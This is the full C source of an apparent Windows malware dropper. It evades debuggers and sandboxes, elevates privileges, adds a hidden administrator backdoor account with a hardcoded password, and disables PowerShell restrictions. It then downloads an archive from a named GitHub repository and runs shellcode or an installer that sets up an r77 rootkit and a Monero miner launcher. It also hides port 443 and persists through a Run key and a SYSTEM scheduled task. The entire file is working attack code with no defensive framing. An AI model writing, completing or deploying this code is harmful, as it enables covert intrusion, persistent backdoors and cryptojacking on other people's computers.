#include <windows.h>
#include <lm.h>
#include <shlobj.h>
#include <urlmon.h>
#include <shlwapi.h>
#include <sddl.h>
#include <wininet.h>

#pragma comment(lib, "netapi32.lib")
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shell32.lib")

// Global state tracking
static const char* g_backdoorUsername = "TBuG";
static BOOL g_accountCreated = FALSE;
static char g_mallDir[MAX_PATH] = {0};
static char g_svchostPath[MAX_PATH] = {0};

// Function prototypes
unsigned char* ObfuscateString(const char* input, size_t len, DWORD key);
char* Deobfuscate(const unsigned char* input, size_t len, DWORD key);
void AntiSandbox();
void ElevatePrivileges();
BOOL IsAdmin();
void CreateBackdoorAccount();
void DisablePowerShellRestrictions();
void DownloadFile(const char* url, const char* savePath);
void DownloadAndExecutePayloads();
void AddToStartup(const char* appName, const char* appPath);
void EstablishPersistence();
void RemoveBackdoorAccount();
void CleanupTemporaryResources();
BOOL IsDebugged();
void RunHiddenCommand(LPCSTR command);

// Custom implementations
#define strcpy(dest, src) lstrcpyA(dest, src)
#define strcat(dest, src) lstrcatA(dest, src)
#define strlen(str) lstrlenA(str)
#define malloc(size) HeapAlloc(GetProcessHeap(), 0, size)
#define free(ptr) HeapFree(GetProcessHeap(), 0, ptr)

// LCG random generator
static DWORD rand_state = 0;
void my_srand(DWORD seed) { rand_state = seed; }
int my_rand() {
    rand_state = (rand_state * 214013 + 2531011);
    return (rand_state >> 16) & 0x7FFF;
}

// Obfuscation macros
#define OBF_KEY (0x55AAFF00 ^ (GetTickCount() & 0xFFFF))
#define OBFUSCATE(str) (const char*)ObfuscateString(str, sizeof(str), OBF_KEY)

// Anti-debugging
BOOL IsDebugged() {
    return IsDebuggerPresent();
}

// String obfuscation
unsigned char* ObfuscateString(const char* input, size_t len, DWORD key) {
    unsigned char* obf = (unsigned char*)malloc(len);
    for(size_t i = 0; i < len; i++) {
        obf[i] = input[i] ^ ((key >> (i % 24)) & 0xFF);
    }
    return obf;
}

char* Deobfuscate(const unsigned char* input, size_t len, DWORD key) {
    char* deob = (char*)malloc(len);
    for(size_t i = 0; i < len; i++) {
        deob[i] = input[i] ^ ((key >> (i % 24)) & 0xFF);
    }
    return deob;
}

// Sandbox evasion
void AntiSandbox() {
    if(GetTickCount() < 180000)  // Exit if in sandbox
        ExitProcess(0);
    
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    if(sysInfo.dwNumberOfProcessors < 2)  // VM check
        ExitProcess(0);
        
    MEMORYSTATUSEX mem;
    mem.dwLength = sizeof(mem);
    GlobalMemoryStatusEx(&mem);
    if(mem.ullTotalPhys < (2ULL * 1024 * 1024 * 1024))  // Less than 2GB RAM
        ExitProcess(0);
}

// Privilege escalation
void ElevatePrivileges() {
    char selfPath[MAX_PATH];
    GetModuleFileNameA(NULL, selfPath, MAX_PATH);
    
    SHELLEXECUTEINFOA sei = { sizeof(sei) };
    sei.lpVerb = "runas";
    sei.lpFile = "cmd.exe";
    sei.nShow = SW_HIDE;
    
    // Build command parameters
    char params[512];
    const char* part1 = Deobfuscate(OBFUSCATE("\" /c \""), 7, OBF_KEY);
    const char* part2 = Deobfuscate(OBFUSCATE(" HIDDEN\""), 9, OBF_KEY);
    lstrcpyA(params, part1);
    lstrcatA(params, selfPath);
    lstrcatA(params, part2);
    free((void*)part1);
    free((void*)part2);
    
    sei.lpParameters = params;
    ShellExecuteExA(&sei);
    ExitProcess(0);
}

// Admin check
BOOL IsAdmin() {
    BOOL isAdmin = FALSE;
    PSID adminGroup;
    SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;
    
    if(AllocateAndInitializeSid(&ntAuth, 2, SECURITY_BUILTIN_DOMAIN_RID, 
        DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup)) {
        CheckTokenMembership(NULL, adminGroup, &isAdmin);
        FreeSid(adminGroup);
    }
    return isAdmin;
}

// Account creation with error handling
void CreateBackdoorAccount() {
    USER_INFO_1 ui = {0};
    DWORD dwError = 0;
    LOCALGROUP_MEMBERS_INFO_3 account = {0};
    
    // Convert username to wide char
    WCHAR usernameW[MAX_PATH] = {0};
    if (MultiByteToWideChar(CP_UTF8, 0, g_backdoorUsername, -1, usernameW, MAX_PATH) == 0) {
        return;
    }
    
    // Check if account already exists
    LPBYTE userInfo = NULL;
    if (NetUserGetInfo(NULL, usernameW, 1, &userInfo) == NERR_Success) {
        NetApiBufferFree(userInfo);
        return;  // Account exists, skip creation
    }
    
    // Get password
    const char* password = Deobfuscate(OBFUSCATE("P@ssw0rd123!"), 13, OBF_KEY);
    if (!password) return;
    
    WCHAR passwordW[MAX_PATH] = {0};
    if (MultiByteToWideChar(CP_UTF8, 0, password, -1, passwordW, MAX_PATH) == 0) {
        free((void*)password);
        return;
    }
    
    // Create user account
    ui.usri1_name = usernameW;
    ui.usri1_password = passwordW;
    ui.usri1_priv = USER_PRIV_USER;
    ui.usri1_flags = UF_SCRIPT | UF_DONT_EXPIRE_PASSWD;
    
    NET_API_STATUS status = NetUserAdd(NULL, 1, (LPBYTE)&ui, &dwError);
    free((void*)password);
    
    if (status != NERR_Success) {
        return;  // Creation failed
    }
    
    g_accountCreated = TRUE;  // Mark for later removal
    
    // Add to administrators group
    account.lgrmi3_domainandname = usernameW;
    status = NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)&account, 1);
    
    if (status != NERR_Success) {
        // PowerShell fallback
        char psCmd[256];
        wsprintfA(psCmd, "powershell -Command \"Add-LocalGroupMember -Group 'Administrators' -Member '%S' -ErrorAction SilentlyContinue\"", 
                 usernameW);
        
        STARTUPINFOA si = { sizeof(si) };
        PROCESS_INFORMATION pi;
        char cmdLine[512];
        wsprintfA(cmdLine, "cmd.exe /c %s", psCmd);
        
        CreateProcessA(
            NULL, cmdLine, NULL, NULL, TRUE,
            CREATE_NO_WINDOW, NULL, NULL, &si, &pi
        );
        WaitForSingleObject(pi.hProcess, 5000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    
    // Hide from login screen
    HKEY hKey;
    const char* regPath = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList";
    if (RegCreateKeyExA(HKEY_LOCAL_MACHINE, regPath, 0, NULL, REG_OPTION_NON_VOLATILE, 
                       KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        DWORD hideValue = 0;
        RegSetValueExA(hKey, g_backdoorUsername, 0, REG_DWORD, 
                      (const BYTE*)&hideValue, sizeof(DWORD));
        RegCloseKey(hKey);
    }
    
    // Remove from Users group
    LOCALGROUP_MEMBERS_INFO_3 removeInfo = {0};
    removeInfo.lgrmi3_domainandname = usernameW;
    NetLocalGroupDelMembers(NULL, L"Users", 3, (LPBYTE)&removeInfo, 1);
}

// Account removal
void RemoveBackdoorAccount() {
    if (!g_accountCreated) return;  // Only remove if we created it
    
    WCHAR usernameW[MAX_PATH];
    if (MultiByteToWideChar(CP_UTF8, 0, g_backdoorUsername, -1, usernameW, MAX_PATH) == 0) {
        return;
    }
    
    // Delete account
    NET_API_STATUS status = NetUserDel(NULL, usernameW);
    if (status != NERR_Success) {
        // PowerShell fallback
        char psCmd[256];
        wsprintfA(psCmd, "powershell -Command \"Remove-LocalUser -Name '%S' -ErrorAction SilentlyContinue\"", 
                 usernameW);
        
        STARTUPINFOA si = { sizeof(si) };
        PROCESS_INFORMATION pi;
        char cmdLine[512];
        wsprintfA(cmdLine, "cmd.exe /c %s", psCmd);
        
        CreateProcessA(
            NULL, cmdLine, NULL, NULL, TRUE,
            CREATE_NO_WINDOW, NULL, NULL, &si, &pi
        );
        WaitForSingleObject(pi.hProcess, 5000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    
    // Clean registry entry
    HKEY hKey;
    const char* regPath = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList";
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, regPath, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegDeleteValueA(hKey, g_backdoorUsername);
        RegCloseKey(hKey);
    }
}

// Disable PowerShell restrictions
void DisablePowerShellRestrictions() {
    HKEY hKey;
    const char* subkey = Deobfuscate(OBFUSCATE("SOFTWARE\\Microsoft\\PowerShell\\1\\ShellIds\\Microsoft.PowerShell"), 63, OBF_KEY);
    const char* value = Deobfuscate(OBFUSCATE("ExecutionPolicy"), 17, OBF_KEY);
    const char* data = Deobfuscate(OBFUSCATE("Unrestricted"), 12, OBF_KEY);
    
    if (!subkey || !value || !data) return;
    
    if (RegCreateKeyExA(HKEY_LOCAL_MACHINE, subkey, 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        DWORD dataLen = lstrlenA(data) + 1;
        RegSetValueExA(hKey, value, 0, REG_SZ, (const BYTE*)data, dataLen);
        RegCloseKey(hKey);
    }
    
    free((void*)subkey);
    free((void*)value);
    free((void*)data);
}

// Download with retries
void DownloadFile(const char* url, const char* savePath) {
    for (int attempt = 0; attempt < 3; attempt++) {
        HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
        if (!hInternet) continue;
        
        HINTERNET hUrl = InternetOpenUrlA(hInternet, url, NULL, 0, 
            INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
        if (!hUrl) {
            InternetCloseHandle(hInternet);
            continue;
        }
        
        HANDLE hFile = CreateFileA(savePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 
            FILE_ATTRIBUTE_HIDDEN, NULL);
        if (hFile == INVALID_HANDLE_VALUE) {
            InternetCloseHandle(hUrl);
            InternetCloseHandle(hInternet);
            continue;
        }
        
        BYTE buffer[4096];
        DWORD bytesRead, bytesWritten;
        BOOL downloadSuccess = TRUE;
        
        while (downloadSuccess && InternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead)) {
            if (bytesRead == 0) break;
            if (!WriteFile(hFile, buffer, bytesRead, &bytesWritten, NULL) || 
                bytesWritten != bytesRead) {
                downloadSuccess = FALSE;
            }
        }
        
        CloseHandle(hFile);
        InternetCloseHandle(hUrl);
        InternetCloseHandle(hInternet);
        
        // Verify file downloaded successfully
        HANDLE hFileCheck = CreateFileA(savePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        if (hFileCheck != INVALID_HANDLE_VALUE) {
            DWORD fileSize = GetFileSize(hFileCheck, NULL);
            CloseHandle(hFileCheck);
            if (fileSize > 1024) {
                return;
            }
        }
        
        DeleteFileA(savePath);
        Sleep(2000); // Wait before retry
    }
}

// Run commands hidden
void RunHiddenCommand(LPCSTR command) {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    char cmdLine[512];
    wsprintfA(cmdLine, "cmd.exe /c %s", command);
    
    CreateProcessA(
        NULL, cmdLine, NULL, NULL, TRUE,
        CREATE_NO_WINDOW, NULL, NULL, &si, &pi
    );
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

// Payload execution
void DownloadAndExecutePayloads() {
    char appDataPath[MAX_PATH];
    if (!GetEnvironmentVariableA("APPDATA", appDataPath, MAX_PATH)) {
        return;
    }
    
    char templatesDir[MAX_PATH];
    lstrcpyA(templatesDir, appDataPath);
    lstrcatA(templatesDir, "\\Microsoft\\Windows\\Templates");
    
    // Ensure hidden directory exists (using $77 prefix for auto-hiding)
    lstrcpyA(g_mallDir, templatesDir);
    lstrcatA(g_mallDir, "\\$77-mall");  // Hidden directory name
    
    if (GetFileAttributesA(g_mallDir) == INVALID_FILE_ATTRIBUTES) {
        CreateDirectoryA(g_mallDir, NULL);
        SetFileAttributesA(g_mallDir, FILE_ATTRIBUTE_HIDDEN);
    }
    
    // Build download URL
    const char* domain = Deobfuscate(OBFUSCATE("github.com"), 11, OBF_KEY);
    const char* path = Deobfuscate(OBFUSCATE("/Drakovthe6th/TBuG/raw/master/mall.zip"), 40, OBF_KEY);
    if (!domain || !path) return;
    
    char mallUrl[256];
    lstrcpyA(mallUrl, "https://");
    lstrcatA(mallUrl, domain);
    lstrcatA(mallUrl, path);
    
    char zipPath[MAX_PATH];
    lstrcpyA(zipPath, templatesDir);
    lstrcatA(zipPath, "\\mall.zip");
    
    // Download mall.zip
    DownloadFile(mallUrl, zipPath);
    
    // Extract with PowerShell
    char psCmd[512];
    wsprintfA(psCmd, 
        "powershell -Command \"Expand-Archive -Path '%s' -DestinationPath '%s' -Force\"",
        zipPath, 
        g_mallDir
    );
    
    // Execute extraction hidden
    RunHiddenCommand(psCmd);
    
    // ===== SHELLCODE INSTALLATION =====
    // 1. Install r77 rootkit via shellcode or fallback to EXE
    char shellcodePath[MAX_PATH];
    lstrcpyA(shellcodePath, g_mallDir);
    lstrcatA(shellcodePath, "\\install.shellcode");
    
    char r77Path[MAX_PATH];
    lstrcpyA(r77Path, g_mallDir);
    lstrcatA(r77Path, "\\install.exe");
    
    HANDLE hFile = CreateFileA(shellcodePath, GENERIC_READ, FILE_SHARE_READ, 
                              NULL, OPEN_EXISTING, 0, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        DWORD fileSize = GetFileSize(hFile, NULL);
        if (fileSize != INVALID_FILE_SIZE && fileSize > 0) {
            // Allocate executable memory
            LPVOID shellcode = VirtualAlloc(NULL, fileSize, 
                                          MEM_COMMIT | MEM_RESERVE, 
                                          PAGE_EXECUTE_READWRITE);
            if (shellcode) {
                DWORD bytesRead;
                if (ReadFile(hFile, shellcode, fileSize, &bytesRead, NULL) && 
                    bytesRead == fileSize) {
                    
                    // Verify MZ header before execution
                    BOOL validShellcode = FALSE;
                    if (bytesRead >= 2) {
                        BYTE* scBytes = (BYTE*)shellcode;
                        if (scBytes[0] == 'M' && scBytes[1] == 'Z') {
                            validShellcode = TRUE;
                        }
                    }
                    
                    if (validShellcode) {
                        // Execute shellcode directly
                        void (*shellcode_func)() = (void (*)())shellcode;
                        shellcode_func();
                        
                        // Allow time for installation
                        Sleep(30000);
                    } else {
                        // Fallback to EXE execution
                        STARTUPINFOA si = { sizeof(si) };
                        PROCESS_INFORMATION pi;
                        CreateProcessA(r77Path, NULL, NULL, NULL, FALSE, 
                                      CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
                        WaitForSingleObject(pi.hProcess, 30000);
                        CloseHandle(pi.hProcess);
                        CloseHandle(pi.hThread);
                    }
                }
                // Don't free memory - shellcode may still be active
            }
        }
        CloseHandle(hFile);
    } else {
        // Shellcode file not found - fallback to EXE
        STARTUPINFOA si = { sizeof(si) };
        PROCESS_INFORMATION pi;
        CreateProcessA(r77Path, NULL, NULL, NULL, FALSE, 
                      CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
        WaitForSingleObject(pi.hProcess, 30000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    // 2. Configure network port hiding for port 443
    HKEY hKey;
    if (RegCreateKeyA(HKEY_LOCAL_MACHINE, 
        "SOFTWARE\\$77config\\tcp_remote", &hKey) == ERROR_SUCCESS) {
        DWORD port = 443;  // Standard HTTPS port
        RegSetValueExA(hKey, "XMR", 0, REG_DWORD, (BYTE*)&port, sizeof(port));
        RegCloseKey(hKey);
    }

    // 3. Execute $77-Egde.exe (miner launcher)
    char edgePath[MAX_PATH];
    lstrcpyA(edgePath, g_mallDir);
    lstrcatA(edgePath, "\\$77-Egde.exe");
    
    // Set svchost path for persistence
    lstrcpyA(g_svchostPath, edgePath);
    
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    CreateProcessA(edgePath, NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    // 4. Execute $77-SystemHelper.exe if present
    char helperPath[MAX_PATH];
    lstrcpyA(helperPath, g_mallDir);
    lstrcatA(helperPath, "\\$77-SystemHelper.exe");
    if (GetFileAttributesA(helperPath) != INVALID_FILE_ATTRIBUTES) {
        CreateProcessA(helperPath, NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    // ===== SHELLCODE INSTALLATION END =====
    
    // Cleanup zip file
    DeleteFileA(zipPath);
    
    // Cleanup memory
    free((void*)domain);
    free((void*)path);
}

// Startup persistence
void AddToStartup(const char* appName, const char* appPath) {
    // Registry persistence
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
                     0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        DWORD pathLen = lstrlenA(appPath) + 1;
        RegSetValueExA(hKey, appName, 0, REG_SZ, (const BYTE*)appPath, pathLen);
        RegCloseKey(hKey);
    }
    
    // Scheduled task persistence
    char cmd[512];
    lstrcpyA(cmd, "schtasks /create /tn \"");
    lstrcatA(cmd, appName);
    lstrcatA(cmd, "\" /tr \"\"");
    lstrcatA(cmd, appPath);
    lstrcatA(cmd, "\"\" /sc onlogon /ru SYSTEM /f");
    
    PROCESS_INFORMATION pi;
    STARTUPINFOA si = { sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    CreateProcessA(NULL, "cmd.exe", NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

// Persistence setup
void EstablishPersistence() {
    // Only set persistence if payload exists
    if (GetFileAttributesA(g_svchostPath) == INVALID_FILE_ATTRIBUTES) {
        return;
    }
    
    const char* startupName = Deobfuscate(OBFUSCATE("WindowsHostService"), 18, OBF_KEY);
    if (startupName) {
        AddToStartup(startupName, g_svchostPath);
        free((void*)startupName);
    }
    
    // Junk encryption to waste analysis time
    BYTE junk[1024];
    DWORD junkKey = GetTickCount();
    for(int i = 0; i < 5000; i++) {
        for(int j = 0; j < sizeof(junk); j++) {
            junk[j] = (junk[j] ^ (junkKey & 0xFF)) + j;
        }
        junkKey = junkKey * 0x343FD + 0x269EC3;
    }
}

// Temporary resource cleanup
void CleanupTemporaryResources() {
    // Remove account if created
    RemoveBackdoorAccount();
    
    // Cleanup only the zip file
    char zipPath[MAX_PATH];
    lstrcpyA(zipPath, g_mallDir);
    PathRemoveFileSpecA(zipPath);  // Go up to parent directory
    lstrcatA(zipPath, "\\mall.zip");
    DeleteFileA(zipPath);
    
    // Cleanup temporary batch file
    char batchPath[MAX_PATH];
    GetTempPathA(MAX_PATH, batchPath);
    lstrcatA(batchPath, "\\sysclean.bat");
    DeleteFileA(batchPath);
}

// Main entry point
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    if(IsDebugged()) return 0;
    
    AntiSandbox();
    
    if(!IsAdmin()) {
        ElevatePrivileges();
        return 0; // Exit after elevation attempt
    }
    
    // Initialize random seed
    my_srand(GetTickCount());
    
    // Error-protected execution sequence
    int stages = 0;
    const int MAX_ATTEMPTS = 2;
    
    for (int attempt = 0; attempt < MAX_ATTEMPTS; attempt++) {
        if (!(stages & 1)) {
            CreateBackdoorAccount();
            stages |= 1;  // Mark account stage complete
        }
        
        if (!(stages & 2)) {
            DisablePowerShellRestrictions();
            stages |= 2;
        }
        
        if (!(stages & 4)) {
            DownloadAndExecutePayloads();
            stages |= 4;
        }
        
        if (!(stages & 8)) {
            EstablishPersistence();
            stages |= 8;
        }
        
        if (stages == 0xF) break;  // All stages complete
        Sleep(5000);  // Wait before retry
    }
    
    // Final cleanup with delay for payload initialization
    Sleep(30000 + (my_rand() % 15000));
    
    // Remove temporary resources but preserve payloads
    CleanupTemporaryResources();
    
    return 0;  // Normal exit without self-destruction
}